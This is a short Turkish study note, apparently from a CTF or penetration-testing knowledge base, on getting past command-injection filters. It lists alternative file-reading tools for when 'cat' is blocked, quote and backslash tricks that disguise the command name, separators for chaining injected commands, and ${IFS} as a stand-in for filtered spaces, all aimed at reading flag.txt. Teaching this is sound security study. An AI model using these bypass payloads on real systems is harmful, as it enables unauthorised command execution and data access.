> [!summary] Özet
> Hedef sistem bazı komutları veya karakterleri filtrelemiş olabilir. Bu notta iki tür atlatma vardır: **yasaklı komutun yerine aynı işi yapan alternatifler** ve **filtreyi karakter hileleriyle kandırma**. Konu bağlamı için bkz. [[4-Exploitation|Exploitation]].

## 1. Yasaklı Komut Yerine Alternatif Araçlar

Web paneli veya uygulama belirli komutları (örneğin `cat`) yasaklamış olabilir. Pes etmek yerine sistemde bulunan alternatif araçlarla aynı sonuca ulaşılır.

**Yasaklı:** `cat flag.txt`

| Alternatif | Ne yapar |
|---|---|
| `tac` | Dosyayı sondan başa doğru okur |
| `less` / `more` | İçeriği sayfa sayfa görüntüler |
| `head` / `tail` | Baştan / sondan satır gösterir |
| `strings` | Dosyadaki okunabilir karakterleri ayıklar |
| `grep . flag.txt` | Her satırı eşleştirerek ekrana basar |
| `sort` | Satırları sıralayarak gösterir |
| `nl` | Satırları numaralandırarak basar |

## 2. Karakter Hileleriyle Filtre Atlatma

Filtre komut adını (`cat`) bir metin olarak arıyorsa, araya komutu bozmayan ama metni değiştiren karakterler sıkıştırılır. Kabuk (shell) bunları çalıştırmadan önce temizler:

```bash
c''at flag.txt        # tırnak araya girer, shell siler
c\at flag.txt         # ters bölü (backslash) ile
ca$@t flag.txt        # boş değişkene genişleyen $@
/bin/cat flag.txt     # tam yol ile ismi gizle
```

## 3. Komut Zincirleme Ayraçları (Separators)

Girdinin meşru komuta eklenerek çalıştığı yerlerde, kendi komutunu zincirlemek için ayraç kullanılır:

| Ayraç | Davranış |
|---|---|
| `;` | İlk komuttan bağımsız olarak ikinciyi çalıştırır |
| `&&` | İlk komut **başarılıysa** ikinciyi çalıştırır |
| `\|\|` | İlk komut **başarısızsa** ikinciyi çalıştırır |
| `\|` | İlk komutun çıktısını ikinciye boru (pipe) ile verir |
| `` `cmd` `` / `$(cmd)` | İç komutu çalıştırıp çıktısını yerine koyar (command substitution) |

> [!tip] Boşluk da filtrelenmişse
> Boşluk yerine `${IFS}` kullanılabilir: `cat${IFS}flag.txt`. `$IFS` kabuğun alan ayracıdır ve varsayılan olarak boşluk/tab içerir.

## İlgili Notlar

- [[4-Exploitation|Exploitation]]: komut enjeksiyonunun Kill Chain'deki yeri
- [[File Upload Attack Methodology|File Upload]]: bir diğer sunucu tarafı (server-side) saldırı
